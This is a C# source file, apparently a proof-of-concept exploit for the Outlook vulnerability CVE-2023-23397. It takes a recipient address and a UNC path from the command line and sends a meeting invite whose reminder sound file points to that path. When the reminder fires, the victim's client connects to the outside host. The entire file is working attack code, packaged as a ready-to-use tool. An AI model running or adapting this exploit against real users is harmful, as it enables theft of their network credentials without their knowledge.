using System;
using Outlook = Microsoft.Office.Interop.Outlook;
using CommandLine;

namespace CVE_2023_23397
{
    internal class Program
    {
        internal class Options
        {
            [Option('t', "to", Required = true, HelpText  = "Recipient email address")]
            public String To { get; set; }

            [Option('p', "path", Required = true, HelpText  = "UNC Path")]
            public String Path { get; set; }

            [Option('s', "subject", Required = false, HelpText  = "Message subject (\"Testing New Exploit\" if blank)")]
            public String Subject { get; set; }

            [Option('b', "body", Required = false, HelpText  = "Message body (\"Here's your meeting invite\" if blank)")]
            public String Body { get; set; }
        }

        private static void SendAppointment(Options opt)
        {

            Console.WriteLine($"[+] Sending email to {opt.To}");

            Outlook.Application oApp = new Outlook.Application();
            Outlook.AppointmentItem oCal  = oApp.CreateItem(Outlook.OlItemType.olAppointmentItem);
            oCal.ReminderSoundFile = opt.Path;
            oCal.Recipients.Add(opt.To);
            oCal.MeetingStatus = Outlook.OlMeetingStatus.olMeeting;
            oCal.Subject = opt.Subject == null ? "Testing New Exploit" : opt.Subject;
            oCal.Location = "Outlook";
            oCal.Body = opt.Body == null ? "Here's your meeting invite" : opt.Body;
            oCal.Start = DateTime.Now;
            oCal.End = DateTime.Now.AddMinutes(30);
            oCal.ReminderOverrideDefault = true;
            oCal.ReminderSet = true;
            oCal.ReminderPlaySound = true;
            oCal.Send();

            Console.WriteLine("[+] Appointment sent");
        }


        static void Main(string[] args)
        {
            CommandLine.Parser.Default.ParseArguments<Options>(args)
                .WithParsed<Options>(opt =>
                {
                    SendAppointment(opt);
           });
        }
    }
}
